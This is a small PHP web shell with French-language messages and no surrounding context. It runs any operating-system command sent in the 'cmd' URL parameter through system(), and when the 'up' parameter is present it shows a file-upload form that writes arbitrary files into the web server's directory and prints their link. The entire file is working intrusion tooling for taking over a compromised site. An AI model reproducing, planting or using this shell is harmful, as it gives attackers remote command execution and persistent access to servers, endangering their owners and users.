<?
if(isset($_GET['cmd'])){  
system($_GET['cmd']);    
}
if(isset($_REQUEST['up'])){
echo "<FORM ENCTYPE=\"multipart/form-data\" METHOD=\"POST\">\n";    
echo "<INPUT TYPE=\"hidden\" NAME=\"MAX_FILE_SIZE\" value=\"500000\">\n";    
echo "Send this file:\n";    
echo "<INPUT NAME=\"avatar\" TYPE=\"file\">\n";    
echo "<INPUT TYPE=HIDDEN NAME=\"X\" VALUE=1>\n";    
echo "<INPUT TYPE=\"submit\" VALUE=\"Send\">\n";    
echo "</FORM>\n";  
if(isset($_FILES['avatar'])){
$dossier = $_SERVER['DOCUMENT_URI'];$fichier = basename($_FILES['avatar']['name']);
if(move_uploaded_file($_FILES['avatar']['tmp_name'], $dossier . $fichier)){
echo  "succes link : ".$dossier.$fichier;}else{echo 'Echec de l\'upload !';}}}
?>